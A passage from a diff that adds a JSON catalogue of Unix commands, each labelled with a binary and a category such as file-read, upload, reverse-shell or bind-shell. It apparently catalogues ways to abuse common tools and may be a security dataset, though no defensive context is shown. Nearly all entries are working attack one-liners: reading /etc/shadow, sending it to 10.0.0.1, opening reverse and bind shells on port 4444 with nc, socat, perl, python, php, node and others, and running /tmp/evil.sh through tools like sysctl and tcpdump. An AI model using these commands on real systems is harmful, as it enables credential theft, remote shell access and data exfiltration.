+      "command": "lp /etc/shadow -h 10.0.0.1",
+      "binary": "lp",
+      "category": "upload"
+    },
+    {
+      "command": "ltrace -F /etc/shadow /dev/null",
+      "binary": "ltrace",
+      "category": "file-read"
+    },
+    {
+      "command": "ltrace -s 999 -o /etc/shadow ltrace -F DATA",
+      "binary": "ltrace",
+      "category": "file-write"
+    },
+    {
+      "command": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",4444));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "binary": "lua",
+      "category": "bind-shell"
+    },
+    {
+      "command": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",4444));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/tmp/evil\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "binary": "lua",
+      "category": "download"
+    },
+    {
+      "command": "lua -e 'local f=io.open(\"/etc/shadow\", \"rb\"); io.write(f:read(\"*a\")); io.close(f);'",
+      "binary": "lua",
+      "category": "file-read"
+    },
+    {
+      "command": "lua -e 'local f=io.open(\"/tmp/evil\", \"wb\"); f:write(\"DATA\"); io.close(f);'",
+      "binary": "lua",
+      "category": "file-write"
+    },
+    {
+      "command": "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"10.0.0.1\",4444);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "binary": "lua",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "lua -e '\n  local f=io.open(\"/etc/shadow\", \"rb\")\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"10.0.0.1\",4444);\n  t:send(d);\n  t:close();'",
+      "binary": "lua",
+      "category": "upload"
+    },
+    {
+      "command": "lwp-download http://10.0.0.1/etc/shadow /tmp/evil",
+      "binary": "lwp-download",
+      "category": "download"
+    },
+    {
+      "command": "lwp-download file:///etc/shadow /dev/stdout",
+      "binary": "lwp-download",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\nlwp-download file:///tmp/tempfile /tmp/evil",
+      "binary": "lwp-download",
+      "category": "file-write"
+    },
+    {
+      "command": "lwp-download file:///etc/shadow /tmp/evil",
+      "binary": "lwp-download",
+      "category": "file-write"
+    },
+    {
+      "command": "lwp-request file:///etc/shadow",
+      "binary": "lwp-request",
+      "category": "file-read"
+    },
+    {
+      "command": "echo 'esyscmd(/tmp/evil.sh)' | m4",
+      "binary": "m4",
+      "category": "command"
+    },
+    {
+      "command": "m4 /etc/shadow",
+      "binary": "m4",
+      "category": "file-read"
+    },
+    {
+      "command": "make -s --eval='$(file >/dev/stdout,$(file </etc/shadow))' .",
+      "binary": "make",
+      "category": "file-read"
+    },
+    {
+      "command": "make -s --eval='$(file >/tmp/evil,DATA)' .",
+      "binary": "make",
+      "category": "file-write"
+    },
+    {
+      "command": "man /etc/shadow",
+      "binary": "man",
+      "category": "file-read"
+    },
+    {
+      "command": "mawk '//' /etc/shadow",
+      "binary": "mawk",
+      "category": "file-read"
+    },
+    {
+      "command": "mawk 'BEGIN { print \"DATA\" > \"/tmp/evil\" }'",
+      "binary": "mawk",
+      "category": "file-write"
+    },
+    {
+      "command": "more /etc/shadow",
+      "binary": "more",
+      "category": "file-read"
+    },
+    {
+      "command": "mosquitto -c /etc/shadow",
+      "binary": "mosquitto",
+      "category": "file-read"
+    },
+    {
+      "command": "msgattrib -P /etc/shadow",
+      "binary": "msgattrib",
+      "category": "file-read"
+    },
+    {
+      "command": "msgcat -P /etc/shadow",
+      "binary": "msgcat",
+      "category": "file-read"
+    },
+    {
+      "command": "msgconv -P /etc/shadow",
+      "binary": "msgconv",
+      "category": "file-read"
+    },
+    {
+      "command": "msgfilter -P -i /etc/shadow /bin/cat",
+      "binary": "msgfilter",
+      "category": "file-read"
+    },
+    {
+      "command": "msgmerge -P /etc/shadow /dev/null",
+      "binary": "msgmerge",
+      "category": "file-read"
+    },
+    {
+      "command": "msguniq -P /etc/shadow",
+      "binary": "msguniq",
+      "category": "file-read"
+    },
+    {
+      "command": "mtr --raw -F /etc/shadow",
+      "binary": "mtr",
+      "category": "file-read"
+    },
+    {
+      "command": "mutt -F /etc/shadow",
+      "binary": "mutt",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\nmv /tmp/tempfile /tmp/evil",
+      "binary": "mv",
+      "category": "file-write"
+    },
+    {
+      "command": "mypy /etc/shadow",
+      "binary": "mypy",
+      "category": "file-read"
+    },
+    {
+      "command": "mypy /etc/shadow --junit-xml /tmp/evil",
+      "binary": "mypy",
+      "category": "file-write"
+    },
+    {
+      "command": "nano /etc/shadow",
+      "binary": "nano",
+      "category": "file-read"
+    },
+    {
+      "command": "nano /tmp/evil\nDATA\n^O",
+      "binary": "nano",
+      "category": "file-write"
+    },
+    {
+      "command": "nasm -@ /etc/shadow",
+      "binary": "nasm",
+      "category": "file-read"
+    },
+    {
+      "command": "nc -l -p 4444 -e /bin/sh",
+      "binary": "nc",
+      "category": "bind-shell"
+    },
+    {
+      "command": "nc -l -p 4444 >/tmp/evil",
+      "binary": "nc",
+      "category": "download"
+    },
+    {
+      "command": "nc 10.0.0.1 4444 >/tmp/evil",
+      "binary": "nc",
+      "category": "download"
+    },
+    {
+      "command": "nc -e /bin/sh 10.0.0.1 4444",
+      "binary": "nc",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "nc -l -p 4444 </etc/shadow",
+      "binary": "nc",
+      "category": "upload"
+    },
+    {
+      "command": "nc 10.0.0.1 4444 </etc/shadow",
+      "binary": "nc",
+      "category": "upload"
+    },
+    {
+      "command": "neofetch --ascii /etc/shadow",
+      "binary": "neofetch",
+      "category": "file-read"
+    },
+    {
+      "command": "nft -f /etc/shadow",
+      "binary": "nft",
+      "category": "file-read"
+    },
+    {
+      "command": "cat >/tmp/tempfile <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /tmp/tempfile",
+      "binary": "nginx",
+      "category": "download"
+    },
+    {
+      "command": "nl -bn -w1 -s '' /etc/shadow",
+      "binary": "nl",
+      "category": "file-read"
+    },
+    {
+      "command": "nm /etc/shadow",
+      "binary": "nm",
+      "category": "file-read"
+    },
+    {
+      "command": "nmap -iL /etc/shadow",
+      "binary": "nmap",
+      "category": "file-read"
+    },
+    {
+      "command": "nmap -oG=/tmp/evil DATA",
+      "binary": "nmap",
+      "category": "file-write"
+    },
+    {
+      "command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(4444)'",
+      "binary": "node",
+      "category": "bind-shell"
+    },
+    {
+      "command": "node -e 'require(\"http\").get(\"http://10.0.0.1/etc/shadow\", res => res.pipe(require(\"fs\").createWriteStream(\"/tmp/evil\")))'",
+      "binary": "node",
+      "category": "download"
+    },
+    {
+      "command": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/etc/shadow\"))'",
+      "binary": "node",
+      "category": "file-read"
+    },
+    {
+      "command": "node -e 'require(\"fs\").writeFileSync(\"/tmp/evil\", \"DATA\")'",
+      "binary": "node",
+      "category": "file-write"
+    },
+    {
+      "command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(4444, \"10.0.0.1\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'",
+      "binary": "node",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "node -e 'require(\"fs\").createReadStream(\"/etc/shadow\").pipe(require(\"http\").request(\"http://10.0.0.1/tmp/evil\"))'",
+      "binary": "node",
+      "category": "upload"
+    },
+    {
+      "command": "nohup /tmp/evil.sh\ncat nohup.out",
+      "binary": "nohup",
+      "category": "command"
+    },
+    {
+      "command": "nroff /etc/shadow",
+      "binary": "nroff",
+      "category": "file-read"
+    },
+    {
+      "command": "ntpdate -a x -k /etc/shadow -d localhost",
+      "binary": "ntpdate",
+      "category": "file-read"
+    },
+    {
+      "command": "octave-cli --eval 'format none; fid = fopen(\"/etc/shadow\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",
+      "binary": "octave",
+      "category": "file-read"
+    },
+    {
+      "command": "octave-cli --eval 'fid = fopen(\"/tmp/evil\", \"w\"); fputs(fid, \"DATA\"); fclose(fid);'",
+      "binary": "octave",
+      "category": "file-write"
+    },
+    {
+      "command": "od -An -c -w999 /etc/shadow",
+      "binary": "od",
+      "category": "file-read"
+    },
+    {
+      "command": "openssl s_client -quiet -connect 10.0.0.1:4444 >/tmp/evil",
+      "binary": "openssl",
+      "category": "download"
+    },
+    {
+      "command": "openssl enc -in /etc/shadow",
+      "binary": "openssl",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | openssl enc -out /tmp/evil",
+      "binary": "openssl",
+      "category": "file-write"
+    },
+    {
+      "command": "openssl enc -in /etc/shadow -out /tmp/evil",
+      "binary": "openssl",
+      "category": "file-write"
+    },
+    {
+      "command": "mkfifo /tmp/socket\n/bin/sh -i </tmp/socket 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4444 >/tmp/socket",
+      "binary": "openssl",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "openssl s_client -quiet -connect 10.0.0.1:4444 </etc/shadow",
+      "binary": "openssl",
+      "category": "upload"
+    },
+    {
+      "command": "openvpn --config /etc/shadow",
+      "binary": "openvpn",
+      "category": "file-read"
+    },
+    {
+      "command": "openvt -- /tmp/evil.sh",
+      "binary": "openvt",
+      "category": "command"
+    },
+    {
+      "command": "pandoc -t plain /etc/shadow",
+      "binary": "pandoc",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | pandoc -t plain -o /tmp/evil",
+      "binary": "pandoc",
+      "category": "file-write"
+    },
+    {
+      "command": "paste /etc/shadow",
+      "binary": "paste",
+      "category": "file-read"
+    },
+    {
+      "command": "pax -w /etc/shadow | tar -xO",
+      "binary": "pax",
+      "category": "file-read"
+    },
+    {
+      "command": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/etc/shadow}\\end{document}'\npdftotext texput.pdf -",
+      "binary": "pdflatex",
+      "category": "file-read"
+    },
+    {
+      "command": "pdflatex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'",
+      "binary": "pdflatex",
+      "category": "file-write"
+    },
+    {
+      "command": "perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>\"10.0.0.1\",PeerPort=>80,Proto=>\"tcp\") or die; print $s \"GET /etc/shadow HTTP/1.1\\r\\nHost: 10.0.0.1\\r\\nMetadata: true\\r\\nConnection: close\\r\\n\\r\\n\"; open(my $fh, \">\", \"/tmp/evil\") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq \"\\r\\n\") { $in_content = 1; } } close($s); close($fh);'",
+      "binary": "perl",
+      "category": "download"
+    },
+    {
+      "command": "perl -ne print /etc/shadow",
+      "binary": "perl",
+      "category": "file-read"
+    },
+    {
+      "command": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "binary": "perl",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>\"10.0.0.1\", PeerPort=>80, Proto=>\"tcp\") or die;open(my $file, \"<\", \"/etc/shadow\") or die;$content = join(\"\", <$file>);close($file);$headers = \"POST / HTTP/1.1\\r\\nHost: 10.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: \" . length($content) . \"\\r\\nConnection: close\\r\\n\\r\\n\";print $s $headers . $content;while (<$s>) { }close($s);'",
+      "binary": "perl",
+      "category": "upload"
+    },
+    {
+      "command": "pg /etc/shadow",
+      "binary": "pg",
+      "category": "file-read"
+    },
+    {
+      "command": "php -r 'echo shell_exec(\"/tmp/evil.sh\");'",
+      "binary": "php",
+      "category": "command"
+    },
+    {
+      "command": "php -r '$r=array(); exec(\"/tmp/evil.sh\", $r); print(join(\"\\n\",$r));'",
+      "binary": "php",
+      "category": "command"
+    },
+    {
+      "command": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/tmp/evil.sh\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",
+      "binary": "php",
+      "category": "command"
+    },
+    {
+      "command": "php -r '$c=file_get_contents(\"http://10.0.0.1/etc/shadow\"); file_put_contents(\"/tmp/evil\", $c);'",
+      "binary": "php",
+      "category": "download"
+    },
+    {
+      "command": "php -r 'readfile(\"/etc/shadow\");'",
+      "binary": "php",
+      "category": "file-read"
+    },
+    {
+      "command": "php -r 'file_put_contents(\"/tmp/evil\", \"DATA\");'",
+      "binary": "php",
+      "category": "file-write"
+    },
+    {
+      "command": "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'",
+      "binary": "php",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "php -S 0.0.0.0:80",
+      "binary": "php",
+      "category": "upload"
+    },
+    {
+      "command": "pic /etc/shadow",
+      "binary": "pic",
+      "category": "file-read"
+    },
+    {
+      "command": "pkg install -y --no-repo-update ./x-1.0.txz",
+      "binary": "pkg",
+      "category": "command"
+    },
+    {
+      "command": "pr -T /etc/shadow",
+      "binary": "pr",
+      "category": "file-read"
+    },
+    {
+      "command": "echo -e ':0\\n| /tmp/evil.sh >/tmp/tempfile\nprocmail -m /tmp/tempfile",
+      "binary": "procmail",
+      "category": "command"
+    },
+    {
+      "command": "ptx -w 999 /etc/shadow",
+      "binary": "ptx",
+      "category": "file-read"
+    },
+    {
+      "command": "puppet filebucket -l diff /dev/null /etc/shadow",
+      "binary": "puppet",
+      "category": "file-read"
+    },
+    {
+      "command": "puppet apply -e 'file { \"/tmp/evil\": content => \"DATA\" }'",
+      "binary": "puppet",
+      "category": "file-write"
+    },
+    {
+      "command": "pwsh -c '\"DATA\" | Out-File /tmp/evil'",
+      "binary": "pwsh",
+      "category": "file-write"
+    },
+    {
+      "command": "pygmentize -l text /etc/shadow",
+      "binary": "pygmentize",
+      "category": "file-read"
+    },
+    {
+      "command": "pyright /etc/shadow",
+      "binary": "pyright",
+      "category": "file-read"
+    },
+    {
+      "command": "pyright --outputjson /etc/shadow",
+      "binary": "pyright",
+      "category": "file-read"
+    },
+    {
+      "command": "pyright -w /etc/",
+      "binary": "pyright",
+      "category": "file-read"
+    },
+    {
+      "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://10.0.0.1/etc/shadow\", \"/tmp/evil\")'",
+      "binary": "python",
+      "category": "download"
+    },
+    {
+      "command": "python -c 'print(open(\"/etc/shadow\").read())'",
+      "binary": "python",
+      "category": "file-read"
+    },
+    {
+      "command": "python -c 'open(\"/tmp/evil\",\"w+\").write(\"DATA\")'",
+      "binary": "python",
+      "category": "file-write"
+    },
+    {
+      "command": "python -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"10.0.0.1\",4444))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'",
+      "binary": "python",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"http://10.0.0.1\", open(\"/etc/shadow\", \"rb\").read())'",
+      "binary": "python",
+      "category": "upload"
+    },
+    {
+      "command": "python -c 'import sys\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", 4444), s.SimpleHTTPRequestHandler).serve_forever()'",
+      "binary": "python",
+      "category": "upload"
+    },
+    {
+      "command": "qpdf --empty --add-attachment /etc/shadow --key=x -- /tmp/evil\nqpdf --show-attachment=x /tmp/evil",
+      "binary": "qpdf",
+      "category": "file-read"
+    },
+    {
+      "command": "rake -f /etc/shadow",
+      "binary": "rake",
+      "category": "file-read"
+    },
+    {
+      "command": "readelf -a @/etc/shadow",
+      "binary": "readelf",
+      "category": "file-read"
+    },
+    {
+      "command": "redcarpet /etc/shadow",
+      "binary": "redcarpet",
+      "category": "file-read"
+    },
+    {
+      "command": "redis-cli -h 127.0.0.1\nconfig set dir /tmp/outdir/\nconfig set dbfilename output-file\nset x \"DATA\"\nsave",
+      "binary": "redis",
+      "category": "file-write"
+    },
+    {
+      "command": "RESTIC_PASSWORD_COMMAND='/tmp/evil.sh' restic backup",
+      "binary": "restic",
+      "category": "command"
+    },
+    {
+      "command": "restic --password-command='/tmp/evil.sh' backup",
+      "binary": "restic",
+      "category": "command"
+    },
+    {
+      "command": "restic backup -r rest:http://10.0.0.1:4444/x /etc/shadow",
+      "binary": "restic",
+      "category": "upload"
+    },
+    {
+      "command": "rev /etc/shadow | rev",
+      "binary": "rev",
+      "category": "file-read"
+    },
+    {
+      "command": "rlogin -l DATA -p 4444 10.0.0.1",
+      "binary": "rlogin",
+      "category": "upload"
+    },
+    {
+      "command": "rlwrap -l /tmp/evil echo DATA",
+      "binary": "rlwrap",
+      "category": "file-write"
+    },
+    {
+      "command": "rpm -ivh x-1.0-1.noarch.rpm",
+      "binary": "rpm",
+      "category": "command"
+    },
+    {
+      "command": "cat >/tmp/tempfile <<EOF\nmodule(load=\"imuxsock\")\n:msg, contains, \"somerandomstring\" ^/tmp/evil.sh\nEOF\n\nrsyslogd -f /tmp/tempfile",
+      "binary": "rsyslogd",
+      "category": "command"
+    },
+    {
+      "command": "ruby -e 'require \"open-uri\"; download = URI.open(\"http://10.0.0.1/etc/shadow\"); IO.copy_stream(download, \"/tmp/evil\")'",
+      "binary": "ruby",
+      "category": "download"
+    },
+    {
+      "command": "ruby -e 'puts File.read(\"/etc/shadow\")'",
+      "binary": "ruby",
+      "category": "file-read"
+    },
+    {
+      "command": "ruby -e 'File.open(\"/tmp/evil\", \"w+\") { |f| f.write(\"DATA\") }'",
+      "binary": "ruby",
+      "category": "file-write"
+    },
+    {
+      "command": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.0.0.1\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+      "binary": "ruby",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "ruby -run -e httpd . -p 80",
+      "binary": "ruby",
+      "category": "upload"
+    },
+    {
+      "command": "rustc /etc/shadow",
+      "binary": "rustc",
+      "category": "file-read"
+    },
+    {
+      "command": "echo 'fn main() { println!(\"DATA\"); }' >/tmp/tempfile\nrustc /tmp/tempfile -o /tmp/evil",
+      "binary": "rustc",
+      "category": "file-write"
+    },
+    {
+      "command": "rustdoc /etc/shadow",
+      "binary": "rustdoc",
+      "category": "file-read"
+    },
+    {
+      "command": "echo '//! DATA' >/tmp/tempfile\nrustdoc /tmp/tempfile -o /tmp/outdir/",
+      "binary": "rustdoc",
+      "category": "file-write"
+    },
+    {
+      "command": "rustfmt /etc/shadow",
+      "binary": "rustfmt",
+      "category": "file-read"
+    },
+    {
+      "command": "mkdir /tmp/tempdir/bin/\nmkdir /tmp/tempdir/lib/\necho '/tmp/evil.sh' >/tmp/tempdir/bin/rustc\nchmod +x /tmp/tempdir/bin/rustc\nrustup toolchain link x /tmp/tempdir/\nrustup run x rustc",
+      "binary": "rustup",
+      "category": "command"
+    },
+    {
+      "command": "scp user@10.0.0.1:/etc/shadow /tmp/evil",
+      "binary": "scp",
+      "category": "download"
+    },
+    {
+      "command": "scp /etc/shadow user@10.0.0.1:/tmp/evil",
+      "binary": "scp",
+      "category": "upload"
+    },
+    {
+      "command": "screen -L -Logfile /tmp/evil echo DATA",
+      "binary": "screen",
+      "category": "file-write"
+    },
+    {
+      "command": "screen -L /tmp/evil echo DATA",
+      "binary": "screen",
+      "category": "file-write"
+    },
+    {
+      "command": "script -q -c '# DATA' /tmp/evil",
+      "binary": "script",
+      "category": "file-write"
+    },
+    {
+      "command": "sed '' /etc/shadow",
+      "binary": "sed",
+      "category": "file-read"
+    },
+    {
+      "command": "sed -n '1s/.*/DATA/w /tmp/evil' /etc/hosts",
+      "binary": "sed",
+      "category": "file-write"
+    },
+    {
+      "command": "sftp user@10.0.0.1\nget /etc/shadow /tmp/evil",
+      "binary": "sftp",
+      "category": "download"
+    },
+    {
+      "command": "sftp user@10.0.0.1\nput /etc/shadow /tmp/evil",
+      "binary": "sftp",
+      "category": "upload"
+    },
+    {
+      "command": "shred -u /tmp/evil",
+      "binary": "shred",
+      "category": "file-write"
+    },
+    {
+      "command": "shuf -z /etc/shadow",
+      "binary": "shuf",
+      "category": "file-read"
+    },
+    {
+      "command": "shuf -e DATA -o /tmp/evil",
+      "binary": "shuf",
+      "category": "file-write"
+    },
+    {
+      "command": "smbclient '\\\\10.0.0.1\\share' -c 'get /etc/shadow /tmp/evil'",
+      "binary": "smbclient",
+      "category": "download"
+    },
+    {
+      "command": "smbclient '\\\\10.0.0.1\\share' -c 'put /etc/shadow /tmp/evil'",
+      "binary": "smbclient",
+      "category": "upload"
+    },
+    {
+      "command": "snap install xxxx_1.0_all.snap --dangerous --devmode",
+      "binary": "snap",
+      "category": "command"
+    },
+    {
+      "command": "socat tcp-listen:4444,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane",
+      "binary": "socat",
+      "category": "bind-shell"
+    },
+    {
+      "command": "socat -u tcp-connect:10.0.0.1:4444 open:/tmp/evil,creat",
+      "binary": "socat",
+      "category": "download"
+    },
+    {
+      "command": "socat -u file:/etc/shadow -",
+      "binary": "socat",
+      "category": "file-read"
+    },
+    {
+      "command": "socat -u 'exec:echo DATA' open:/tmp/evil,creat",
+      "binary": "socat",
+      "category": "file-write"
+    },
+    {
+      "command": "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane",
+      "binary": "socat",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "socat -u file:/etc/shadow tcp-connect:10.0.0.1:4444",
+      "binary": "socat",
+      "category": "upload"
+    },
+    {
+      "command": "socket -svp '/bin/sh -i' 4444",
+      "binary": "socket",
+      "category": "bind-shell"
+    },
+    {
+      "command": "socket -qvp '/bin/sh -i' 10.0.0.1 4444",
+      "binary": "socket",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "soelim /etc/shadow",
+      "binary": "soelim",
+      "category": "file-read"
+    },
+    {
+      "command": "sort -m /etc/shadow",
+      "binary": "sort",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | sort -m -o /tmp/evil",
+      "binary": "sort",
+      "category": "file-write"
+    },
+    {
+      "command": "split -b 999 --additional-suffix suffix /etc/shadow prefix\ncat prefixaasuffix",
+      "binary": "split",
+      "category": "file-read"
+    },
+    {
+      "command": "split -b 999 --additional-suffix suffix /etc/shadow prefix",
+      "binary": "split",
+      "category": "file-write"
+    },
+    {
+      "command": "sqlite3 <<EOF\nCREATE TABLE x(x TEXT);\n.import /etc/shadow x\nSELECT * FROM x;\nEOF",
+      "binary": "sqlite3",
+      "category": "file-read"
+    },
+    {
+      "command": "sqlite3 /dev/null -cmd \".output /tmp/evil\" 'select \"DATA\";'",
+      "binary": "sqlite3",
+      "category": "file-write"
+    },
+    {
+      "command": "ss -a -F /etc/shadow",
+      "binary": "ss",
+      "category": "file-read"
+    },
+    {
+      "command": "ssh user@10.0.0.1 'cat /etc/shadow\"",
+      "binary": "ssh",
+      "category": "download"
+    },
+    {
+      "command": "ssh -F /etc/shadow x",
+      "binary": "ssh",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | ssh user@10.0.0.1 'cat >/tmp/evil\"",
+      "binary": "ssh",
+      "category": "upload"
+    },
+    {
+      "command": "ssh-copy-id -f -i /etc/shadow.pub user@10.0.0.1",
+      "binary": "ssh-copy-id",
+      "category": "file-read"
+    },
+    {
+      "command": "ssh-copy-id -f -i /etc/shadow.pub -t /tmp/evil user@host",
+      "binary": "ssh-copy-id",
+      "category": "file-write"
+    },
+    {
+      "command": "ssh-keyscan -f /etc/shadow",
+      "binary": "ssh-keyscan",
+      "category": "file-read"
+    },
+    {
+      "command": "sshfs -o ssh_command=/tmp/evil.sh x: /tmp/dir/",
+      "binary": "sshfs",
+      "category": "command"
+    },
+    {
+      "command": "sshfs user@10.0.0.1:/ /tmp/dir/\ncp /tmp/dir/etc/shadow /tmp/evil",
+      "binary": "sshfs",
+      "category": "download"
+    },
+    {
+      "command": "sshfs user@10.0.0.1:/ /tmp/dir/\ncp /etc/shadow /tmp/dir/",
+      "binary": "sshfs",
+      "category": "upload"
+    },
+    {
+      "command": "strace -s 999 -o /tmp/evil strace - DATA",
+      "binary": "strace",
+      "category": "file-write"
+    },
+    {
+      "command": "strings /etc/shadow",
+      "binary": "strings",
+      "category": "file-read"
+    },
+    {
+      "command": "sysctl 'kernel.core_pattern=|/tmp/evil.sh'",
+      "binary": "sysctl",
+      "category": "command"
+    },
+    {
+      "command": "sysctl -n \"/../../etc/shadow\"",
+      "binary": "sysctl",
+      "category": "file-read"
+    },
+    {
+      "command": "systemd-run /tmp/evil.sh",
+      "binary": "systemd-run",
+      "category": "command"
+    },
+    {
+      "command": "tac -s 'RANDOM' /etc/shadow",
+      "binary": "tac",
+      "category": "file-read"
+    },
+    {
+      "command": "tail -c+0 /etc/shadow",
+      "binary": "tail",
+      "category": "file-read"
+    },
+    {
+      "command": "tailscale serve --http=4444 /etc/shadow",
+      "binary": "tailscale",
+      "category": "upload"
+    },
+    {
+      "command": "tar xvf user@10.0.0.1:/etc/shadow.tar --rsh-command=/bin/ssh",
+      "binary": "tar",
+      "category": "download"
+    },
+    {
+      "command": "tar cf /dev/stdout /etc/shadow -I 'tar xO'",
+      "binary": "tar",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\ntar cf /tmp/tempfile.tar /tmp/tempfile\ntar Pxf /tmp/tempfile.tar --xform s@.*@/tmp/evil@",
+      "binary": "tar",
+      "category": "file-write"
+    },
+    {
+      "command": "tar cvf user@10.0.0.1:/tmp/evil /etc/shadow --rsh-command=/bin/ssh",
+      "binary": "tar",
+      "category": "upload"
+    },
+    {
+      "command": "tbl /etc/shadow",
+      "binary": "tbl",
+      "category": "file-read"
+    },
+    {
+      "command": "tclsh\nset s [socket 10.0.0.1 4444];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",
+      "binary": "tclsh",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "echo /tmp/evil.sh >/tmp/tempfile\nchmod +x /tmp/tempfile\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/tempfile",
+      "binary": "tcpdump",
+      "category": "command"
+    },
+    {
+      "command": "tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /tmp/evil.sh",
+      "binary": "tcpdump",
+      "category": "command"
+    },
+    {
+      "command": "tcpdump -ln -i lo -w /tmp/evil -c 1 -Z user",
+      "binary": "tcpdump",
+      "category": "file-write"
+    },
+    {
+      "command": "tcsh -c 'echo DATA >/tmp/evil'",
+      "binary": "tcsh",
+      "category": "file-write"
+    },
+    {
+      "command": "echo DATA | tee /tmp/evil",
+      "binary": "tee",
+      "category": "file-write"
+    },
+    {
+      "command": "mkfifo /tmp/socket\ntelnet 10.0.0.1 4444 </tmp/socket | /bin/sh >/tmp/socket",
+      "binary": "telnet",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "terraform console\nfile(\"/etc/shadow\")",
+      "binary": "terraform",
+      "category": "file-read"
+    },
+    {
+      "command": "tftp 10.0.0.1\nget /etc/shadow",
+      "binary": "tftp",
+      "category": "download"
+    },
+    {
+      "command": "tftp 10.0.0.1\nput /etc/shadow",
+      "binary": "tftp",
+      "category": "upload"
+    },
+    {
+      "command": "tic -C /etc/shadow",
+      "binary": "tic",
+      "category": "file-read"
+    },
+    {
+      "command": "tmux -f /etc/shadow",
+      "binary": "tmux",
+      "category": "file-read"
+    },
+    {
+      "command": "troff /etc/shadow",
+      "binary": "troff",
+      "category": "file-read"
+    },
+    {
+      "command": "tsc /etc/shadow.ts",
+      "binary": "tsc",
+      "category": "file-read"
+    },
+    {
+      "command": "tsc /etc/shadow.ts --outFile /tmp/evil",
+      "binary": "tsc",
+      "category": "file-write"
+    },
+    {
+      "command": "ul /etc/shadow",
+      "binary": "ul",
+      "category": "file-read"
+    },
+    {
+      "command": "unexpand -t999 /etc/shadow",
+      "binary": "unexpand",
+      "category": "file-read"
+    },
+    {
+      "command": "uniq /etc/shadow",
